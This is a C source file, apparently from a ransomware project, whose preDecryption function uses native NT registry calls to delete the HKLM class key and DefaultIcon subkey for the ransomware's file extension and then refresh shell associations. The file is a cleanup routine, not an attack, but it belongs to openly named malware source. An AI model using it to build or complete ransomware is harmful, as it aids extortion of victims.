#include "pre.h"
#include <ShlObj.h>
#include <winternl.h>
#include <other/settings.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(*LPOPENKEY)	(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(*LPDELETEKEY)	(HANDLE);

BOOL preDecryption()
{
	// Remove default icon
	HMODULE hModule = LoadLibraryW(L"ntdll.dll");
	if (!hModule)
		return FALSE;
	
	BOOL status = FALSE;
	LPOPENKEY _NtOpenKey = (LPOPENKEY)GetProcAddress(hModule, "NtOpenKey");
	if (!_NtOpenKey)
		goto cleanup;
	LPDELETEKEY _NtDeleteKey = (LPDELETEKEY)GetProcAddress(hModule, "NtDeleteKey");
	if (!_NtDeleteKey)
		goto cleanup;
	
	// Delete DefaultIcon subkey
	wchar_t registryPathSub[MAX_PATH];
	wsprintfW(registryPathSub, L"\\Registry\\Machine\\Software\\Classes\\%ls\\DefaultIcon", RANSOMWARE_EXTENSION);
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING uniString;
	RtlInitUnicodeString(&uniString, registryPathSub);
	InitializeObjectAttributes(&objAttr, &uniString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	HANDLE hHandle;
	if (NT_ERROR(_NtOpenKey(&hHandle, KEY_ALL_ACCESS, &objAttr)))
		goto cleanup;
	if (NT_ERROR(_NtDeleteKey(hHandle)))
		goto cleanup;
	NtClose(hHandle);
	
	// Delete key
	wchar_t registryPath[MAX_PATH];
	wsprintfW(registryPath, L"\\Registry\\Machine\\Software\\Classes\\%ls", RANSOMWARE_EXTENSION);
	RtlInitUnicodeString(&uniString, registryPath);
	InitializeObjectAttributes(&objAttr, &uniString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (NT_ERROR(_NtOpenKey(&hHandle, KEY_ALL_ACCESS, &objAttr)))
		goto cleanup;
	if (NT_ERROR(_NtDeleteKey(hHandle)))
		goto cleanup;
	
	NtClose(hHandle);
	status = TRUE;

	// Notify the system
	SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);

cleanup:
	FreeLibrary(hModule);
	return status;
}